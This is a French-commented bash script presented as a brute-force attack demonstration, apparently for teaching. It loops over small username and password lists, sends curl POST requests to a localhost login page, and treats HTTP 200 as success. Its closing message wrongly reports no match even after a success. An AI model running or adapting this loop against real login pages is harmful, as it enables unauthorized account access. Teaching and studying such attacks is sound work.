#!/bin/bash

# Script de démonstration d'attaque brute force
# On forge et execute un ensemble de requêtes en tentant
# toutes les combinaisons possibles de login et de mot de passe
# (Imaginez avoir une grande base de données, notamment de mots de 
# passe à partir du dictionnaire de la langue, variations des mots, etc.)

# Définir l'URL de la page de connexion (à attaquer)
login_url='http://localhost:8990/login.php'

# Dictionnaire

# Liste des noms d'utilisateur à essayer
usernames=("user" "jdoe" "admin")

# Liste des mots de passe à essayer
passwords=("password1" "password" "admin")

# Boucle sur tous les noms d'utilisateur
for user in "${usernames[@]}"; do
    # Boucle sur tous les mots de passe
    for pass in "${passwords[@]}"; do
        # Tentative d’authentification en utilisant cURL
        # -s : silent (supprime message d'erreur), -o /dev/null : redirige la sortie dans /dev/null -w "%{http_code}" : écrit le code status
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST -d "login=$user&password=$pass" "$login_url")
        
        # Vérifier si la tentative d’authentification a réussi (ici avec le code HTTP 200)
        if [ "$response" -eq 200 ]; then
            echo "Connexion réussie avec $user:$pass !"
            #exit 0  # Terminer le script après une connexion réussie
        else
            echo "Tentative de connexion avec $user:$pass a échoué"
        fi
    done
done

echo "Tentatives d'authentification épuisées. Aucune correspondance trouvée dans le dictionnaire."
